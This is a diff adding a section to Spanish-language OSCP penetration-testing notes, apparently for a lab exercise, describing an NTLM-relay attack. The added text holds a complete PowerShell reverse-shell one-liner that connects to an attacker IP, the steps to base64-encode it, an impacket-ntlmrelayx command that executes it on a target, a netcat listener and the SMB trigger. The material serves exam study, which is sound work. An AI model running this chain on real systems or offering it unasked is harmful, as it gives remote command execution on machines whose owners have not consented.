@@ -123,6 +123,33 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
   ![image](https://github.com/loqasto/OSCP/assets/111526713/05039fb0-22bc-42d3-83a7-a30f7bd9111e)
 
+  ### NTLM-relay attack
+
+  Tenemos acceso con el usuario 'files02admin' a la máquina 'files01':
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/6e4955e6-8773-4b18-a063-20b102efc4cb)
+
+  Codificamos en base64 una cadena de powershell reverse-shell de una sola línea, que apunte a nuestra máquina de ataque:
+
+    $TEXTO = '$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.212'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+    $ENCODED1 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXTO))
+    Write-Output $ENCODED1
+
+  Con ntlmrelay de Impacket, nos ponemos en escucha para recibir una conexión por smb que ejecute la rev shell:
+
+    └─# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.245.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...."
+
+  Nos ponemos en escucha por el puerto indicado en la one liner de PS:
+
+    nc -lnvp 443
+
+  Y desde la máquina files01 intentamos conectarnos por SMB a nuestra máquina con ntlmrelay corriendo, los que hará que se ejecuta la rev shell de powershell y nos llegue la shell al puerto en escucha:
+
+    dir \\192.168.45.212\test
+
+  ![image](https://github.com/loqasto/OSCP/assets/111526713/473ec30f-1b0c-4063-8ffd-d3a27518903c)
+
+
 ## Vulnerabilidades conocidas
 
 Apache HTTP Server 2.4.49 - Path traversal
